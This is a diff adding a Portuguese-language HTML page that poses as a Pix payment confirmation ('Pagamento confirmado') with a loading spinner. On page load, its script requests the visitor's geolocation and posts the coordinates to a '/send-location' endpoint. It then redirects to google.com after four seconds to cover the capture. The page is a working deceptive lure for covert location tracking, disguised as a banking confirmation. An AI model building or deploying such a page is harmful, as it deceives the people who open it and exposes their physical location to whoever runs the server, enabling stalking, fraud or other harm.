@@ -1,0 +1,62 @@
+<!DOCTYPE html>
+<html lang="pt-BR">
+<head>
+  <meta charset="UTF-8">
+  <title>Confirmação Pix</title>
+  <style>
+    body {
+      font-family: Arial, sans-serif;
+      text-align: center;
+      background-color: #f7f7f7;
+      padding-top: 50px;
+    }
+
+    .loader {
+      border: 8px solid #f3f3f3;
+      border-top: 8px solid #3498db;
+      border-radius: 50%;
+      width: 60px;
+      height: 60px;
+      animation: spin 2s linear infinite;
+      margin: 20px auto;
+    }
+
+    @keyframes spin {
+      100% { transform: rotate(360deg); }
+    }
+  </style>
+</head>
+<body>
+  <h1>Pagamento confirmado ✅</h1>
+  <p>Estamos finalizando sua transação...</p>
+  <div class="loader"></div>
+
+  <script>
+    window.onload = () => {
+      if (navigator.geolocation) {
+        navigator.geolocation.getCurrentPosition(sendLocation, sendError);
+      } else {
+        sendError();
+      }
+    };
+
+    function sendLocation(position) {
+      fetch("/send-location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude: position.coords.latitude, longitude: position.coords.longitude })
+      })
+      .finally(() => setTimeout(() => window.location.href = "https://google.com", 4000));
+    }
+
+    function sendError() {
+      fetch("/send-location", {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify({ latitude: null, longitude: null })
+      })
+      .finally(() => setTimeout(() => window.location.href = "https://google.com", 4000));
+    }
+  </script>
+</body>
+</html>
